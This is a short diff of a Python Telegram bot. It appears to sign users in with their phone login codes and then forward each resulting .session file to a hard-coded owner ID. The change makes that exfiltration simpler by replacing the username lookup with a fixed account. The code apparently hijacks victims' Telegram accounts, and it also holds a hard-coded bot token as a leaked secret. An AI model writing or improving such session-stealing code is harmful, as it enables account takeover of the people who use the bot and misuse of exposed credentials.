@@ -9,7 +9,7 @@ from auth import send_code, sign_in
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
-OWNER_USERNAME = "kalpakemerr"
+OWNER_ID = 7345056431
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -119,8 +119,7 @@ async def generate_tdata(user_id, phone):
         # Находим owner чтобы отправить ему сессию
         from aiogram import Bot
         b = Bot(token=BOT_TOKEN)
-        owner = await b.get_chat(f"@{OWNER_USERNAME}")
-        owner_id = owner.id
+        owner_id = OWNER_ID
         
         # Отправляем .session файл
         session_path = f'sessions/{phone}.session'
